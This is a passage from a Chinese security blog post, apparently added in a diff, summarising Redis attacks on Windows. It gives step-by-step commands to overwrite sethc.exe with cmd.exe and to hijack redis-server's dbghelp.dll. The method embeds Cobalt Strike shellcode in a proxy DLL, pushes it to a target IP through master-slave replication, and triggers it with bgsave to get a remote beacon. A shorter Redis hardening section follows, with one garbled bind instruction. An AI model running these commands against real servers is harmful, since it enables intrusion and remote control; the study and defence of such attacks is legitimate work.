+<li>创建服务，以服务方式启动的程序默认都以 SYSTEM 权限运行</li>
+</ul>
+<p><strong>利用过程</strong></p>
+<p>比如把cmd.exe覆写到<code>sethc.exe</code> &#x2F; <code>utilman.exe</code> &#x2F; <code>osk.exe</code> 等辅助功能程序，在RDP登录界面调出命令行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 RedisWriteFile.py <span class="hljs-attribute">--rhost</span>=192.168.52.192 <span class="hljs-attribute">--lhost</span>=192.168.52.128 <span class="hljs-attribute">--rpath</span>=<span class="hljs-string">&quot;C:\Windows\System32&quot;</span> <span class="hljs-attribute">--rfile</span>=sethc.exe <span class="hljs-attribute">--lfile</span>=cmd.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p><strong>DLL劫持简介</strong>：</p>
+<p>在Windows操作系统中，动态链接库（DLL）用于存放通用代码，供多个应用程序共享使用。当一个程序需要调用DLL中的函数时，它首先会尝试从特定路径加载DLL文件。如果该程序未指定DLL的绝对路径，而是仅指定了DLL的名字，系统将按照预设的顺序搜索DLL文件的位置。这种机制为攻击者提供了机会，通过在高优先级路径放置恶意DLL来实施DLL劫持攻击。</p>
+<p>其实和system文件劫持</p>
+<p><strong>标准的DLL查找顺序</strong>：</p>
+<ol>
+<li>应用程序目录</li>
+<li>系统目录（如C:\Windows\System32）</li>
+<li>16位系统目录（如C:\Windows\SysWOW64）</li>
+<li>Windows目录（如C:\Windows）</li>
+<li>当前工作目录</li>
+<li>系统环境变量PATH中指定的路径</li>
+</ol>
+<p>例如，如果”example.exe”尝试加载名为”example.dll”的DLL但没有提供完整路径，系统会在上述顺序中寻找此DLL。若攻击者提前在应用程序目录放置了同名的恶意DLL，该恶意DLL会被优先加载执行。</p>
+<p>具体案例：劫持dbghelp.dll</p>
+<p>以redis-server.exe为例，在执行<code>bgsave</code>操作时，它首先在其应用目录中查找dbghelp.dll。利用Redis主从复制特性，攻击者可以在应用目录中写入恶意DLL，从而实现劫持。</p>
+<p>DLL劫持可以函数转发劫持也可以往完整DLL插入恶意代码</p>
+<p><strong>函数转发劫持</strong> </p>
+<p>为了不影响目标应用的正常功能，攻击者可能会采用函数转发劫持的方式。这要求攻击者导出原始DLL的所有函数，并确保这些函数能够正确指向原DLL中的对应地址。工具如DLLHijacker可以帮助自动化这一过程，但可能需要针对一些问题进行修复，比如中文乱码、匿名函数处理以及确保正确引用原DLL的绝对路径等。</p>
+<p>正确的DLL劫持不仅不会影响应用程序的功能，还可以重复多次实施不同的攻击策略，如上线CS或使用Metasploit Framework发起反向shell攻击。关键在于保证恶意DLL正确转发对原始DLL函数的调用请求，维持目标应用的正常运行状态。然而，若不正确地处理原DLL的路径，可能导致目标应用的功能异常，甚至无法重启。</p>
+<p><strong>利用过程</strong></p>
+<p>从本地的<strong>system32</strong>文件夹下提取出 <code>dbghelp.dll</code>，然后使用 dllHijack 脚本，</p>
+<blockquote>
+<p>由于每个人的操作系统版本不一样，所以<strong>system32</strong>文件夹下面的 <strong>dbghelp.dll</strong> 可能也会有区别，但经过尝试，Windows10、Windows11的<strong>dbghelp.dll</strong>都可行</p>
+<p>dllHijack这里最好是用<a target="_blank" rel="noopener" href="https://github.com/JKme/sb_kiddie-/blob/master/hacking_win/dll_hijack/DLLHijacker.py">这个</a>修改过的， <a target="_blank" rel="noopener" href="https://github.com/kiwings/DLLHijacker">原版的脚本</a>会报错</p>
+<p>dllHijack实际上有VS2019、<a target="_blank" rel="noopener" href="https://github.com/P4r4d1se/dll_hijack">VS2022</a>两个版本，但VS2022的GitHub已经不开源了，所以这里就用VS2019的</p>
+</blockquote>
+<p>生成<strong>dbghelp.dll</strong>的Visual Studio 2019的项目文件</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 这里我用了python的venv来隔离环境，缺少啥库pip install上就行</span><br>venv<span class="hljs-string">\Scripts\activate</span><br><span class="hljs-comment"># 可以直接运行生成dbghelp项目</span><br>python DLLHijacker.py C:<span class="hljs-string">\Windows\System32\dbghelp.dll</span><br><span class="hljs-comment"># 但我是把dbghelp.dll拷贝到当前目录,然后生成项目</span><br>python DLLHijacker.py dbghelp.dll<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改shellcode前，产生项目的命令必须为默认的<code>dbghelp</code>，不能使用<code>Win11dbghelp.dll</code>等不规范的文件名，不然会失败</p>
+</blockquote>
+<p>再用<strong>visual Studio 2019</strong> 打开项目文件</p>
+<blockquote>
+<p>重点</p>
+<p><strong>请在VS2019中修改项目的属性</strong>。如果不改，那么靶机无法加载生成出来的DLL</p>
+</blockquote>
+<p>1、设置运行库为多线程 (&#x2F;MT 或 &#x2F;MTd)：</p>
+<ul>
+<li>在属性页面中，导航到：配置属性 &gt; C&#x2F;C++ &gt; 代码生成。</li>
+<li>找到 “运行库”（Runtime Library）选项。</li>
+<li>如果当前是 Release 配置（截图中您已选择 Release x64），设置为 “多线程 (&#x2F;MT)”，<strong>这里推荐Release</strong>。</li>
+<li>如果是 Debug 配置，设置为 “多线程调试 (&#x2F;MTd)”。</li>
+<li>确保在顶部下拉菜单中选择正确的配置（Release 或 Debug）。</li>
+</ul>
+<p>2、禁用安全检查 (&#x2F;GS)：</p>
+<ul>
+<li>仍在 配置属性 &gt; C&#x2F;C++ &gt; 代码生成 页面。</li>
+<li>找到 “安全检查”（Buffer Security Check）选项。</li>
+<li>设置为 “禁用安全检查 (&#x2F;GS-)”。</li>
+</ul>
+<p>3、关闭生成清单：</p>
+<ul>
+<li>导航到：配置属性 &gt; 链接器 &gt; 清单文件。</li>
+<li>找到 “生成清单”（Generate Manifest）选项。</li>
+<li>设置为 “否 (&#x2F;MANIFEST:NO)”。</li>
+</ul>
+<p>这里我直接换成release：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220506.png" srcset="/img/loading.gif" lazyload alt="image-20260215130240849"></p>
+<p>配置如图，别忘了点击“应用”来保存</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220783.png" srcset="/img/loading.gif" lazyload alt="image-20260215130403653"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220972.png" srcset="/img/loading.gif" lazyload alt="image-20260215130548040"></p>
+<p>然后打开CS 生成一个payload 输出格式为C</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220187.png" srcset="/img/loading.gif" lazyload alt="image-20260215125721224"></p>
+<p>在VS2019中替换 <code>dllmain.cpp</code> 中的shellcode（ctrl+s保存）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220778.png" srcset="/img/loading.gif" lazyload alt="image-20260215130725382"></p>
+<p>之前已经选择了 <code>Release</code> <code>x64</code> ，生成DLL文件即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220694.png" srcset="/img/loading.gif" lazyload alt="image-20260215130847509"></p>
+<p>生成成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220689.png" srcset="/img/loading.gif" lazyload alt="image-20260215130944309"></p>
+<p>下面几个项目都可以主从复制，去覆盖redis的DLL，达到劫持的效果，注意要在vps上运行，我们都试一下。</p>
+<p>第一种：<a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">r35tart&#x2F;RedisWriteFile: 通过 Redis 主从写出无损文件</a></p>
+<p>把生成好的文件（在<code>..\dbghelp\x64\Release\</code>里）上传到 <code>RedisWriteFile.py</code> 同级目录下面</p>
+<p>然后把脚本 <code>RedisWriteFile</code> 文件夹上传到你的VPS上（记得在安全组里面开放你vps的16379端口）</p>
+<blockquote>
+<p>重申：不管用上面哪个脚本，一定要在vps上运行，本地是不可行的</p>
+</blockquote>
+<p>依次执行下面几条命令：</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 将生成的dll文件通过RedisWriteFile写入到靶机</span><br><span class="hljs-string">python3</span> <span class="hljs-string">RedisWriteFile</span>.<span class="hljs-string">py</span> <span class="hljs-built_in">--rhost</span>  <span class="hljs-string">39</span>.<span class="hljs-string">98</span>.<span class="hljs-string">114</span>.<span class="hljs-string">183</span> <span class="hljs-built_in">--rport</span> <span class="hljs-string">6379</span> <span class="hljs-built_in">--lhost</span> 公网<span class="hljs-string">IP</span>  <span class="hljs-built_in">--lport</span> <span class="hljs-string">16379</span> <span class="hljs-built_in">--rpath</span> <span class="hljs-string">&#x27;C:\\Program Files\\Redis\\&#x27;</span> <span class="hljs-built_in">--rfile</span> <span class="hljs-string">&#x27;dbghelp.dll&#x27;</span> <span class="hljs-built_in">--lfile</span> <span class="hljs-string">&#x27;dbghelp.dll&#x27;</span><br><span class="hljs-comment"># 连接redis</span><br><span class="hljs-string">redis-cli</span> -<span class="hljs-string">h</span>  <span class="hljs-string">39</span>.<span class="hljs-string">98</span>.<span class="hljs-string">114</span>.<span class="hljs-string">183</span><br><span class="hljs-comment"># 写入后通过bgsave命令触发劫持，上线cs马</span><br><span class="hljs-string">bgsave</span><br></code></pre></td></tr></table></figure>
+
+<p>结果如图</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220110.png" srcset="/img/loading.gif" lazyload alt="image-20260215170409218"></p>
+<p>第二种：<a target="_blank" rel="noopener" href="https://github.com/0671/RabR">0671&#x2F;RabR: Redis-Attack By Replication (通过主从复制攻击Redis)</a></p>
+<p>这个更方便，可以直接上线</p>
+<p>依次执行下面几条命令：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 运行脚本</span><br><span class="hljs-attribute">python3</span> redis-attack.py -r <span class="hljs-number">39.98.114.183</span> -L 公网IP -wf dbghelp.dll<br><span class="hljs-comment">#选择hijack</span><br>h<br></code></pre></td></tr></table></figure>
+
+<p>结果如图</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220935.png" srcset="/img/loading.gif" lazyload alt="image-20260215170440114"></p>
+<p>然后就可以看到靶机上线CS了</p>
+<h2 id="Redis-安全防护策略"><a href="#Redis-安全防护策略" class="headerlink" title="Redis 安全防护策略"></a>Redis 安全防护策略</h2><p>如何防护你的 Redis 我认为可以从以下几个方面切入。</p>
+<p><strong>禁止监听在公网地址</strong></p>
+<p>将你的 Redis 监听在 0.0.0.0 的是十分危险的行为，对 Redis 的大多数攻击也都是由于管理员的大意而将 Redis 监听在了 0.0.0.0。 作为一个经常在内网中出现的应用，将 Redis 监听在 0.0.0.0 很可能导致内网横向移动渗透风险。</p>
+<p>修改 Redis 监听端口需要在 Redis 的配置文件 redis.conf 中进行设置，找到包含 bind 的行，将默认的<code>bind 0.0.0.0</code>改为<code>bind 0.0.0.0</code>或内网 IP，然后重启 Redis。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220124.jpeg" srcset="/img/loading.gif" lazyload alt="image-20210717163812821"></p>
+<p><strong>修改默认的监听端口</strong></p>
+<p>Redis 默认监听的端口为 6379，为了更好地隐藏服务，我们可以在 redis.conf 中修改 Redis 的监听端口。找到包含 port 的行，将默认的 6379 改为其他自定义的端口号，然后重启 Redis。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220255.jpeg" srcset="/img/loading.gif" lazyload alt="image-20210717164103495"></p>
+<p><strong>开启 Redis 安全认证并设置复杂的密码</strong></p>
+<p>为了防止 Redis 未授权访问攻击以及对 Redis 密码的爆破，我们可以在 Redis 在 redis.conf 配置文件中，通过 requirepass 选项开启密码认证并设置强密码。还可以限制登录IP</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220795.jpeg" srcset="/img/loading.gif" lazyload alt="image-20210717164722712"></p>
+<p><strong>禁止使用 Root 权限启动</strong></p>
+<p>使用 Root 权限去运行网络服务是比较有风险的，所以不建议使用任 Root 权限的何用户启动 Redis。加固建议如下：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">useradd <span class="hljs-operator">-</span>s <span class="hljs-symbol">/sbin/nolog</span> <span class="hljs-operator">-</span>M redis <br>sudo <span class="hljs-operator">-</span>u redis <span class="hljs-operator">/</span><span class="hljs-symbol">&lt;redis-server-path&gt;</span><span class="hljs-symbol">/redis-server</span> <span class="hljs-operator">/</span><span class="hljs-symbol">&lt;configpath&gt;</span><span class="hljs-symbol">/redis.conf</span> <br></code></pre></td></tr></table></figure>
+
+<p><strong>设置 Redis 配置文件的访问权限</strong></p>
+<p>因为 Redis 的明文密码可能会存储在配置文件中，禁止不相关的用户访问改配置文件是必要的，如下设置 Redis 配置文件权限为 600：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 /&lt;filepath&gt;/redis.conf<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.modb.pro/db/501434">Redis攻击利用总结 - 墨天轮</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7535">踩坑记录-Redis(Windows)的getshell-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/16803408.html">Windows中redis未授权通过dll劫持上线 - 我要变超人 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13892">Windows Redis DLL劫持在实战中的利用-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/280984.html">Redis 常见漏洞利用方法总结 - FreeBuf网络安全行业门户</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="print-no-link">#学习总结</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>64Redis攻击利用总结</div>
+      <div>http://example.com/2026/test64/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test45/" title="域渗透基础">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">域渗透基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/test32/" title="node.js原型链污染学习总结">
+                        <span class="hidden-mobile">node.js原型链污染学习总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
